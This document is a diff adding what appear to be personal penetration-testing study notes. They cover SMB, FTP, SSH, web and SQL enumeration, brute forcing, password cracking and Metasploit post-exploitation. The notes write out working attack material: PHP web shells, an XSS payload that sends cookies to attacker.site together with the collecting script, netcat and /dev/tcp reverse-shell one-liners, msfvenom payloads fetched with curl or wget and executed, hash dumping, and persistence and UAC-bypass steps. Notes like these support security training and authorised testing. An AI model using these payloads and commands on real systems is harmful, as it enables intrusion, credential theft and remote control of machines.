@@ -1,0 +1,721 @@
+NMAP
+
+	locate *.nse |grep whatever
+	subl $(locate *.nse |grep whatever)
+
+
+
+SMB Lessons
+	
+	SMB - can be used to mount drives like a file share
+
+	SMB NMAP Scripts
+
+		find all NMAP Scirpts with "locate *.nse |grep (ex. SMB-enum or SMB-vuln)"
+
+	SMBMAP
+
+		smbmap -u guest -p "" -d . -H $IP
+		can use -x to execute shell commands
+		can use -L to list contents
+		can use -r to see contents of shares (ex 'c$')
+		can use --upload and --download files. Could be used to make a reverse shell
+
+	Samba SMB
+
+		use [nmap $IP -sU --top-port 25 --open] to scan common UDP ports
+		can use smb-os-discovery to enumerate
+		can use nmblookup -A $IP to enum NetBios on UDP port
+		can use [SMBclient -L $IP -N] to check for null sessions
+		If RPC is open use [rpcclient -U "" -N $IP] to check for null sessions
+
+		Enum4Linux to enum info, usernames, and null sessions
+		use smb-enum-users and smb-enum-shares to gather info
+		enum4linux -U $IP for user list
+		RPCclient >> enumdomusers >> lookupnames (username) to find SID
+
+		enum4linux -G to list groups
+		rpcclient >> enumdomgroups to list groups
+		enum4linux -i to list printers
+		smbclient //$IP/Share -N to connect with null session
+
+		metasploit smb_login module to brute force passwords
+		set rhosts, pass_file, and smbuser
+		can also use hydara -l (username) -P (password file) $IP Service(ex. SMB)
+
+		If SMB is open, might be able to access services that are piped into it using pipe_auditor module
+
+
+FTP Lessons
+
+	FTP Recon
+
+		Hydra is your friend if you use the right password lists
+		can also use nmap script ftp-brute --script-args userdb=filepath -p 21
+		can run ftp-anon script to see if anonymous login is allowed
+
+SSH Lessons
+
+	SSH Recon
+
+		can connect with ssh $Username@$IP, or with [nc $IP $Port#]
+		use ssh2-enum-algos script to enum algorithms for keys
+		use ssh-hostkey --script-args ssh_hostkey=full to find server hostkey
+		can also use ssh-auth-methods --script-args="ssh.user=$Username" to see if they use a rsa key or password for auth
+
+		Again, can use hydra to brute passwords if using the right wordlist
+		Can use nmap script ssh-brute --script-args userdb=/root/$filepath if you echo a username into a file
+		Can also use ssh_login module with options rhosts, userpass_file, Stop_on_success, and verbose
+
+
+HTTP Lessons
+
+	ISS Recon
+		
+		Tools: WhatWeb, Dirb (For subdirectories), Browsh
+
+		Can use http-enum script and http-headers script for enum
+		nmap $IP --script http-methods --script-args http-methods.url-path=[Dir to enum]
+		http-webdav-scan?
+
+	Apache Recon
+
+		http-enum and http-header
+		scanner/http/http_version
+		curl $IP | more
+		wget "http://$IP/index" >> cat index
+		browsh --startup-url $IP to render website wtihout browser
+		lynx http://$IP
+		scanner/http/brute_dirs for dir enum
+		auxilliary/scanner/http/robots_txt
+
+SQL Lessons
+	
+	SQL Recon
+
+		can use mysql -h $ip -u root to see if root is available
+		scanner/mysql/mysql_writable_dirs >> /usr/share/metasploit-framework/data/wordlists/directory.txt to check access to system directories through the database
+		scanner/mysql/mysql_hashdump to enumerate password hashes
+		select load_file("/etc/shadow");
+		nmap script mysql-empty-password to see if there are any empty passwords
+		nmap script mysql-info
+		nmap script mysql-users (needs username and password)
+		nmap script mysql-databases (needs username and password)
+		nmap script mysql-variables, look for datadir
+		nmap script mysql-audit --scritp-args="mysql-audit.username="
+		nmap script mysql-dump-hashes
+		nmap script mysql-query --script-args="query='select -----;'"
+
+
+Information Gathering
+
+
+	site: company.com
+	dnsdumpster.com
+	sublist3r -d (domain) and -b (bruteforce)
+	virustotal: search
+	crt.sh for SSL Cert info
+	View the website certificates to see if any Subdomain info is in there
+	amass? apt install snapd >> service snapd start >> snap install amass
+
+
+Footprinting & Scanning
+
+
+	fping -a (alive) -g (ping sweep) IPRANGE 2>/dev/null
+	nmap -sn IPRANGE 
+		Save Ranges to a txt file and include them using nmap -sn -iL LIST.txt
+	can use --osscan-guess to guess more aggressively
+
+	nmap -sT (TCP) is a full connection, will show up in logs
+	nmap -sS (SYN) is a silent scan, will not show up in logs but could still be stopped by an IDS
+	nmap -sV (Version) scans the version
+	nmap -Pn to assume server is online and skip the ping check
+
+	Firewalls can be a false positive when scanning ports. Use --reason for verbose versioning
+	Could use MassScan too?
+
+
+Vulnerability Assessment
+
+	
+	run "service nessusd start" to start nessus on port 8834
+
+
+Web Attacks
+
+	
+	Web Server Fingerprinting
+		can use (nc TARGETIP 80) to banner grab for HTTP and see what HTTP Verbs are allowed
+		can use (openssl s_client -connect target.site:443) to banner grab for HTTPS
+		can use (httprint -P0 (no ping) -h <target hosts> -s <signature file>) to scan for server signatures
+
+		When scanning HTTP Verbs like Get and Post, be careful of PUT. REST API's PUT creates new content/data, but HTTP PUT allows us to create/upload a file
+
+	Exploiting HTTP Verbs
+
+		DELETE - Might be able to use the below commands to delete resources.
+
+		nc victim.site 90
+		DELETE /path/to/resource.txt HTTP/1.0
+
+		PUT - Will need to know the size of the file you're uploading in bytes to exploit. Can be done with (wc [word counter] -m payload.php) then:
+
+		nc victim.site 80 
+		PUT /payload.php HTTP/1.0
+		Content-type: text/html
+		Content-length: (length)
+
+		Below is a PHP Shell that we can upload to run commands!
+
+			<?php
+			if (isset ($_GET['cmd']))  ##Runs the following code if the GET "cmd" parameter is set
+			{
+				$cmd - $_GET['cmd'];   ##Reads the command to execute
+				echo  '<pre>';
+				$result = shell_exec($cmd); ##Runs the command by using the OS shell
+				echo $result;          ##Displays command output
+				echo '</pre>';
+			}
+			?>
+
+		Then we can run things like (victim.site/shell.php?cmd=ls) from a browser and run commands
+
+	Netcat
+
+		(nc -lvp 8888) to start listening over TCP on all interfaces. Can use -lvup for UDP
+		(nc -v (verbose) IP Port)
+
+		can use (echo "hello" | nc -v IP Port) to pipe commands into Netcat. This closes the Netcat session once complete.
+
+		can use (nc -lvp Port > Text File) to record a NC session
+
+		can use -e to execute a command
+
+			BIND SHELL
+
+			When you are connecting to a target and the target is listening, it's a BIND shell.
+
+			(nc -lvp PORT -e /bin/bash) will open a bash shell whenever something connects. When something connects, the machine that connects to the server will be able to execute commands on the server and then receive the output
+
+	Web Directory and File Enumeration
+
+		can use Dirbuster or Dirb to enumerate web directories and files
+
+		OWASP DirBuster can let you fine tune the URL, HTTP methods, List or Pure Brute Force attacks, and others
+
+		DIRB
+
+			dirb $TARGET $WORDLIST
+
+				-a to change user agent - can make you look like you're coming from a certain browser. See Web for agent strings
+
+				-p to set PROXY - can be used with BurpSuite
+
+				-c to set a cookie if you have one
+
+				-u to set username and password. HTTP request will encode it in base64, and BurpSuite can decode it
+
+				-h to set a custom header
+
+				-r means NOT RECURSIVE - don't try to brute force sub directories when found
+
+				-z to set a delay in ms so WAF don't block you
+
+				-s silent, will only display successes
+
+				-X to search for file extensions in a comma separated list
+
+				-x to pass in a file with file extensions to search
+
+				-o to set OUTPUT
+
+	XSS
+
+		Reflected XSS
+
+			Malicious payload is sent from the browser to the website. The payload from the HTTP request immediately is shown (reflected) on the page.
+
+		Persistent XSS
+
+			The payload is stored on the server, and is then executed when a user's browser requests the page and loads the payload. Usually in HTML forms or blogs
+
+		Cookies Stealing
+
+			JavaScript can access cookies if the HttpOnly flag is not enabled. Can use the below setup to steal cookies!
+
+			Payload:
+
+				This will create an "image" file that the page will load and execute the commands
+
+				<script>
+				var i = new Image();
+				i.src="http://attacker.site/log.php?q="+document.cookie;
+				</script>
+
+			Attacker Server:
+
+				The "log.php" file will be on the attacker server listening for the call
+
+				<?php
+				$filename="/tmp/log.txt";
+				$fp=fopen($filename, 'a');
+				$cookie=$_GET['q'];
+				fwrite($fp, $cookie);
+				fclose($fp);
+				?>
+
+		XSSER Tool
+
+			Can use XSSER To test for XSS vulnerabilities with BurpSuite
+
+			POST:
+
+				xsser --url 'HTTP://TARGET/FILE.php' -p (post request) 'bad=XSS&arguments=XSS'
+
+				Pass "XSS" into the argument fields to test for vulnerabilities
+
+				Also use the --auto flag to use different XSS payloads
+
+				can use --Fp to try a custom payload like "<script>alert(1)</script>"
+
+			GET:
+
+				xsser --URL 'HTTP://TARGET/FILE.php?bad=XSS&arguments=XSS'
+
+				Pass "XSS" into the argument fields to test for vulnerabilities
+
+				Also use the --auto flag to use different XSS payloads
+
+				can use --Fp to try a custom payload like "<script>alert(1)</script>"
+
+	SQL Injections
+
+		Certain .php files will actually query a backend database. To see if one id injectable, simply change the argument value to a "'" symbol, which is a termination key in SQL
+
+		BOOLEAN BASED
+
+			test with a (' OR '1'='1') and (' OR '1'='11') to test true/false injections. If successful, the database is your oyster
+
+		UNION BASED
+
+			test with (' UNION SELECT payload; -- -';)
+			The first "'" is to close the string in the original query
+
+		SQLMap
+
+			sqlmap -u <URL> 
+
+			-b to get Banner
+
+			--tables to grab all tables and columns
+
+			--current-db <database> to specify database 
+
+				--columns to grab columns
+				--dump to grab all contents
+
+			-p to specify what parameter (argument) you want to test on
+
+			--technique to specify what type of injection you want to perform. U for Union
+
+			-v3 for verbose
+
+			--users to enumerate users
+
+			--dbs to see what databases are connected to the application
+
+			-D <database> to specify a database
+
+				--tables to grab tables from the DB
+
+			-T <table> to speficy what table you want from the DB
+
+			-C <columns> to speficy what columns you want from the table
+
+			--data to specify input for a POST parameter exploit
+
+			--os-shell to open up a shell on the machine in question
+
+		SQLMAP AND BURPSUITE
+
+			Username and Password field might be open to SQL injection
+
+			Can use the Repeater section of BurpSuite to send the same packet repeatedly and change the REQUEST section to test for SQL Injection by adding a "'" to the parameter values
+
+			Can use BurpSuite to export the HTTP Get or Post request to a file, and then use the -r argument to have SQLMAP use that request for further testing
+
+System Attacks
+
+	BackDoors
+
+		NCAT (man ncat for help). Works just like NetCat
+
+		Can use the exploit/windows/local/s4u_persistence module if a Meterpreter session is created
+
+		Can set payload to a meterpreter Reverse TCP shell with (set payload windows/meterpreter/reverse_tcp)
+
+		Can run "screenshot" from meterpreter and it will take a screenshot of the current display of the PC
+
+	Password Attacks
+
+		John the Ripper for cracking password hashes
+
+			(cat /etc/passwd) will show the usernames, but an "x" directly to the right of the username means the passwords have been shadowed. Run (unshadow /etc/passwd /etc/shadow > FILE >> cat FILE) to unshadow
+
+			john --wordlist-/usr/share/john/password.lst FILE to crack using a wordlist
+
+		Hashcat
+
+			uses the GPU, which works well if not in a VM. GPUs usually have 128+ cores, while the CPU has 4-8
+
+			-m for Hash Type
+
+			-o for Output
+
+			-b for efficiency test
+
+			-d to specify device (GPU or CPU)
+
+			-O to optimize performance
+
+			(hashcat -m 0 (MD5) -a 0 (dictionary attack) TargetFile DictionaryFile)
+
+			-r to add rule files
+
+			can use masks to specify password patterns and increase likelyhoods
+
+	Buffer Overflows
+
+		The data stack uses Last in First Out when adding and removing data from the stack
+
+			Push adds an element to the stack
+
+			Pop removes the last inserted element
+
+		You can add things to the top of the stack, and software routines can Pop elements from the top of the stack and use them
+
+		Applications can randomly access positions on the stack in modern applications, and can reserve memory allocations for later use. If you overflow the parts of the stack above another reservation, it feeds into the reservation below it.
+
+
+Network Attacks
+
+
+	Authentication Cracking
+
+		Hydra is your friend
+
+		hydra -L users.txt -P pass.txt <service://server> <options>
+
+		can use --http-post-form to crack website login forms. EX - if the incorrect password message is "invalid credentials"
+
+			hydra target.site http-host-form "/login.php:usr=^USER^&pass^PASS^:invalid credentials" -L User.txt -P Pass.txt -f (exit after first found login) -V (verbose)
+
+		can use (hydra -U <service>) to get a help page for cracking that protocol. SSH for example
+
+		You can check the encryption method used for hashing the passwords in the /etc/passwd and /etc/shadow files by running the following command
+
+			grep -A 18 ENCRYPT_METHOD /etc/login.defs
+
+		When cracking hashes, remove the first and last part of the hash as shown below
+
+			admin:$6$2PjhBcvO4tMWKi5W$k/UUyb5mb3qTJ6Fr15cReTb0n/DQ9isy7knhpskIEQG.s9eB8auxVqrroksib7uQyiCtrJIgr48XmR8o7Pa7O/:18945:0:99999:7:::
+
+			Delete "admin:" and ":18945:0:99999:7:::"
+
+			$6$2PjhBcvO4tMWKi5W$k/UUyb5mb3qTJ6Fr15cReTb0n/DQ9isy7knhpskIEQG.s9eB8auxVqrroksib7uQyiCtrJIgr48XmR8o7Pa7O/
+
+		CRACKING PASSWORD OF MICROSOFT WORD FILE
+
+			use (/usr/share/john/office2john.py MS_WORD_DOCUMENT.docx > hash) to extract the crackable info
+
+				should get something like MS_WORD_DOCUMENT.docx:$office$*2013*100000*256*16*ff2563844faca58a12fc42c5036f9cf8*ffaf52db903dbcb6ac2db4bab6d343ab*c237403ec97e5f68b7be3324a8633c9ff95e0bb44b1efcf798c70271a54336a2
+
+				then go to town (john --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt hash)
+
+				alternatively, can use hashcat if the "MS_WORD_DOCUMENT.docx:" part is removed first
+
+	Windows Shares
+
+		NetBIOS
+
+			Works on the Transport layer, between IPv4 and the Application layer
+			TCP port 139 for the NetBIOS Session (for file transfers to and from Windows shares)
+			UDP port 138 for NetBIOS datagrams (for sending small messages to many other hosts and listing the shares and machines)
+			UDP port 137 for NetBIOS name resolution (to find workgroups)
+
+		Universal Naming Convention paths (\\ServerName\ShareName\file.nat)
+
+			c$ is for the drive volume
+			admin$ points to the installation directory
+			ipc$ is used for inter-process communication
+
+		Null Sesions
+
+			In Windows, can use nbtStat to enumerate shares on a local or remote target
+
+				nbtstat -A <target ip address>
+
+				ELS-WINXP <00> UNIQUE Registered		##<00> means workstation, UNIQUE means one IP address
+				WORKGROUP <00> GROUP Registered
+				ELS-WINXP <20> UNIQUE Registered		##<20> means the file shareing service is up and running
+				WORKGROUP <1E> GROUP Registered
+
+				Can then run NET VIEW <target IP> to enum shares
+
+			In Linux, can use nmblookup to perform the same opperations
+
+				nmblookup -A <target ip address>
+
+			Can use smbclient to connect to shares and see the hidden shares like IPC$ and ADMIN$
+
+				smbclient -L //IP -N
+
+					-L look at what services are available
+
+					-N forces tool to not ask for passwords
+
+			To check for null sessions while using Windows run (NET USE \\<target IP address>\IPC$ '' /u:'')
+
+				can use (smbclient //IP/IPC$ -N) to check for null sessions
+
+			enum4linux is your friend
+
+				enum4linux <target IP address> <parameters>
+
+					-S to enum shares
+
+					-U to enum users
+
+					-P to enum password policy
+
+					-n to run the nbtstat command
+
+					-s <wordlist> to run a brute force enumeration of shares using a wordlist. Might find a hidden share
+
+					-a to run all available options
+
+					-d for detailed information
+
+			use (nmap -sS -p 135,139,445 SUBNET) to enum target machines for share enums
+
+				also use (nmap -sU --top-ports 25 <target>) to see if 137 and 138 are open/filtered
+
+			can use the samrdump.py script for similar functionality
+
+				/usr/share/doc/python-impacket-doc/examples/samrdump.py
+
+				python samrdump.py <target>
+
+			can use NMAP for smb enum
+
+				nmap -script=smb-enum-shares <target>
+				nmap -script=smb-enum-users <target>
+				nmap -script=smb-brute <target>
+
+			use SMBMAP as well when enumerating
+
+				smbmap <arguments> <target IP>
+
+				-H to enum permissions on shares
+
+			and SMBCLIENT to connect to public shares
+
+				smbclient //<target>/<share> <arguments>
+
+				-N for no password prompt
+
+				get <file> - will print the contents in standard output (on the screen) instead of downloading
+
+
+	Metasploit
+
+		can run nmap --script smb-check-vulns.nse --script-args=unsafe=1 <target> to scan for SMB vulnerabilities
+
+		(show payload) to show available payloads for specific exploit modules
+
+		Meterpreter
+
+			run (getsystem) to escalate privileges to system or admin (if UAC policy doesn't prevent it)
+
+				use (bypassuac) module to bypass the UAC restriction. Will launch a new Meterpreter session
+
+			use (exploit/windows/local/persistence_service) to install a Meterpreter backdoor on the PC that can be caught with the (exploit/multi/handler) module
+
+			use (migrate)  to migrate the session into the explorer process
+
+			use (post/windows/gather/credentials/windows_autologin) to gather the auto-login creds for the machine
+
+			Bind and Reverse Shells
+
+				windows/meterpreter/reverse_tcp
+				windows/meterpreter/bind_tcp
+				linux/x86/meterpreter/reverse_tcp
+				java/meterpreter/bind_tcp
+
+			System Info Enum
+
+				sysinfo
+				ifconfig or ipconfig
+				route
+				getuid
+
+			use (post/windows/gather/hashdump) to grab the hashes on the system
+
+	Beyond Code Execution
+
+		If you can upload a file to a server, see if you can upload a WEBSHELL. See below section for more details
+
+		can use 'sleep' to see if a website/php file is vulnerable to command execution
+
+		If we're able to run commands on a remote system, start looking for tools on the remote system that can be exploited
+
+			echo $PATH
+			which nc
+			which python
+			which curl
+			which wget
+
+			NETCAT
+
+				start a nc listener with (nc -lvp <port>)
+				spawn a bash shell with (nc) nc <attacker IP> <port> -e /bin/bash
+
+			CURL
+
+				start a nc listener with (nc -lvp <port>)
+				curl http://<attacker>:<port>/'<command>'
+
+				the results should appear in standard out. However, if the output contains spaces, HTTP may not send the data back.
+
+				to work around it, encode the command in base64 with '<command> | base64'
+
+				can read file contents using 'file -T <dir/file>'
+
+				If you have a DIR you can write in on the target, a tool to move the files to, and an http server on the attacker machine, you can start a meterpreter session
+
+					Move to the DIR where the file you want to move is located and run 'python -m SimpleHTTPServer <port; 9090>'
+
+					create a reverse shell payload with msfvenom
+
+						msfvenom -p <payload; linux/x64/shell_reverse_tcp> lhost=<attacker IP> lport=<attacker port> -f elf -o <file name>
+
+					run the command 'curl http://<attacker IP>:<attacker HTTP Server Port>/filename -o /tmp/r' to upload the file.
+
+					run 'chmod +x /tmp/r' to make the file executable
+
+						can run the upload command one more time to make sure the file is there if you're not sure about write privileges
+
+					start a NC listener on the port from the MSFVENOM module
+
+					start the shell by running '/tmp/r' on the target
+
+				UPGRADE SHELL TO TERMINAL
+
+					When you get a shell, run 'bash -i' to make the shell interactive and a little more friendly
+
+					spawn a terminal using [python -c 'import pty; pty.spawn("/bin/sh")']
+
+
+		Shells
+
+			Webshells are scripts writen in a language executed on the server. Can be used for server-side code execution
+
+			https://rosettacode.org/wiki/Execute_a_system_command for more info
+
+				ASP shells on Windows Servers
+				JSP shells on Apache Tomcat
+				PHP shells on classic Apache
+
+			PHP Web Shell
+
+				<html>
+				<?php
+
+				echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></$=ok></form>";
+				system($_GET["cmd"]);
+
+				?>
+				<html>
+
+			Payloads
+
+				Staged vs Stageless
+
+					Staged payloads are separated with a "/" in msfvenom, and will not create a shell all on there own. They'll need to be downloaded and run on the target machine by other means. Much smaller than Stageless. (linux/x64/shell/reverse_tcp)
+
+					Stageless payloads have to be caught with a Metasploit listener, since Metasploit has the proper logic to catch the session. (linux/x64/shell_reverse_shell)
+
+
+BlackBox Tests
+
+	1)
+
+		Always run a version check to see if anything good comes up for Metasploit
+
+		Can use (run autoroute -s <subnet> -n <subnet_mask>) from the Meterpreter console, or (route add <subnet> <subnet_mask> <Meterpreter Session ID#>) to pivot.
+
+			Alternatively, can use (sudo ip route add <subnet>/<cidr> via <gateway_ip> dev <network_card_name>)
+
+		ALWAYS run auxiliary/scanner/portscan/tcp just to see what comes back
+
+		can use "portfwd" in Meterpreter to forward ports from a remote machine to localhost, even if it's in a different subnet
+
+	2)
+
+		ALWAYS check all ports that you see for web servers.
+
+			ALWAYS run DIRB on all web ports available to see if directories pop up
+
+			Check EVERYTHING
+
+		see if a /.git/ directory is available and curl it
+
+			run (git clone http://<URL>/<Directory>) to clone into the working directory, then cd into the clone
+
+			run (git log) to see a log of the changes and (git diff <commit#1> <commit#2>) to see changes made
+
+		Vim - my antithesis
+
+			press <i> for insert mode where it works like a normal text editor
+			press <ESC> to leave insert mode
+
+		Can make changes with VIM and then run (git add .) from the clone to stage it for commitment, then (git commit -m "Commit_Name" --author "Whatever") and then (git push) - will ask for creds
+
+		Exploit command execution vulns on a webserver by starting a reverse shell
+
+			(echo 'bash -c "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1"' | base64) to get a command that can be passed into a webform. Start a NC listener
+
+			(__import__("os").system("echo <base64_payload> | base64 -d | bash") is the python payload. Have to check the GIT source code to see what is executing what and where. In this example the code from GIT is a .py file
+
+			[find / -iname *flag* 2>/dev/null] (/) is to look for a directory, (-iname *flag*) to see what files contain "flag", and (2>/dev/null) to escape errors
+
+			Meterpreter is better than terminal if you can get it. If WGET is available...
+
+				Run (msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f elf > payload.bin) to generate a payload file for upload.
+
+					run (file payload.bin) to make sure everything goes good
+
+				Run (python3 -m http.server 80) to start a server on port 80.
+
+					When this is run, everything in the working directory will be up for grabs
+
+				From the target, run (wget http://<attacker_ip>/payload.bin) to grab the file, then chmod +x payload.bin to make it an executable
+
+				Start a listener with the [exploit/multi/handler] module. Set payload to (linux/x64/meterpreter/reverse_tcp) in this case
+
+				From the target, run ./payload.bin to run the exploit
+
+			Add Routes if necessary
+
+		Socks Proxy
+
+			Can convert the Meterpreter session into a Socks Proxy with [auxiliary/server/socks_proxy]
+
+				Version 4A
+				SrvPort 9050
+				run -j to run as a job in the background
+
+			Can then run (proxychains nmap <target>) to scan machines in other networks
+
+			Can visit websites by adding the proxy to a browser as a SOCKS Host on 127.0.0.1
